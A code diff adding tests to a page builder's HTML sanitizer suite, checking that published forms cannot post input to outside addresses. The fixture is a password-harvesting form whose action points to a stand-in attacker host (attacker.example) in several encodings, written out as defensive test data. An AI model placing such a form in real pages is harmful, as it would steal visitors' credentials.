@@ -8,6 +8,7 @@ import {
   sanitizePageBuilderCssForStorage,
   stripUnsafePageBuilderHtml,
 } from './pageBuilderHtml';
+import { sanitizeCustomPageHtml } from './sanitize';
 
 describe('page builder storage sanitizers', () => {
   it('uses a parser-backed allow-list for malformed and nested hostile markup', () => {
@@ -42,6 +43,42 @@ describe('page builder storage sanitizers', () => {
     expect(result).not.toContain('position:fixed');
     expect(result).not.toContain('z-index');
     expect(result).not.toContain('javascript:');
+  });
+
+  describe('F-282: a published form can only send to this site', () => {
+    const harvestingForm = (action: string) => `
+      <form action="${action}" method="post">
+        <label for="pw">Password</label><input id="pw" type="password" name="password">
+        <button type="submit">Sign in</button>
+        <a href="https://example.test/about">About</a>
+      </form>
+    `;
+
+    it.each([
+      ['an outside web address', 'https://attacker.example/collect'],
+      ['a scheme-relative outside address', '//attacker.example/collect'],
+      ['a mixed-case outside address', 'HTTPS://Attacker.Example/collect'],
+      ['the platform API', '/api/v2/auth/login'],
+    ])('drops a form action pointing at %s, when stored and when rendered', (_label, action) => {
+      const stored = stripUnsafePageBuilderHtml(harvestingForm(action));
+      const rendered = sanitizeCustomPageHtml(harvestingForm(action));
+
+      for (const output of [stored, rendered]) {
+        expect(output).not.toContain(action);
+        expect(output.toLowerCase()).not.toContain('attacker.example');
+        expect(output).not.toMatch(/\saction=/i);
+        // Control: an ordinary outbound LINK is still allowed — only where
+        // form input is sent is restricted.
+        expect(output).toContain('href="https://example.test/about"');
+      }
+    });
+
+    it('keeps a form action on this site, when stored and when rendered', () => {
+      expect(stripUnsafePageBuilderHtml(harvestingForm('/contact'))).toContain('action="/contact"');
+      expect(sanitizeCustomPageHtml(harvestingForm('/contact'))).toContain('action="/contact"');
+      expect(stripUnsafePageBuilderHtml(harvestingForm(`${window.location.origin}/contact`)))
+        .toContain(`action="${window.location.origin}/contact"`);
+    });
   });
 
   it('serializes safe unscoped CSS and drops global, escaped, and active declarations', () => {
